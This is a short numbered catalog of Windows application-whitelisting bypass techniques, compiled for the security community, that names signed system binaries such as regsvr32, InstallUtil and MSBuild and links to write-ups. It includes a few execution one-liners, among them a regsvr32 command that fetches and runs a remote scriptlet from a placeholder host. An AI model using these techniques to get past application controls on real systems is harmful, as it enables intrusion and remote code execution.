# The List
#
# As many organizations adopt a Whitelisting Strategy, this list seeks to compile known bypass techniques that can be used
# by the security community.
#
# There are many various ways to WhiteList Applications
# Future release will attempt to catalog what works against specific techniques.

# Version .0.0.3

1. IEExec

This technique may work in certain environments.  Its relies on the fact that many organizations trust executables signed
by Microsoft.  We can misuse this trust by launching a specially crafted .NET application. 
Example Here: http://www.room362.com/blog/2014/01/16/application-whitelist-bypass-using-ieexec-dot-exe/

2.  Rundll32.exe

3.  ClickOnce Applications dfsvc.exe dfshim.dll

4.  XBAP - XML Browser Applications WPF PresentationHost.exe

5.  MD5 Hash Collision 
http://www.mathstat.dal.ca/~selinger/md5collision/

6.  PowerShell
Specifically Reflective Execution
http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/
https://www.defcon.org/images/defcon-21/dc-21-presentations/Bialek/DEFCON-21-Bialek-PowerPwning-Post-Exploiting-by-Overpowering-Powershell.pdf

7. .HTA Application Invoke PowerShell Scripts
    Launched by mshta.exe, bypasses IE security settings as well.

8.  bat, vbs, ps1
    1. cmd.exe /k < script.txt
    2. cscript.exe //E:vbscript script.txt
    3. Get-Content script.txt | iex
    
9. Malicious Troubleshooting packs - MSDT.exe
    Reference: http://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/
    Thanks to @nberthaume, @Killswitch_GUI 
    
10. InstallUtil.exe
    A signed MS binary that loads assemblies and executes - One of the best.
    Examples here: https://gist.github.com/subTee

11. Regsvcs/Regasm
    See: https://gist.github.com/subTee/fb09ef511e592e6f7993
    These 2 are Excellent.
12. regsvr32.exe 
    https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302
    This one is just simply amazing... 
    regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll

13. Msbuild.exe
    http://subt0x10.blogspot.com/2016/09/bypassing-application-whitelisting.html



I'd love to hear other techniques
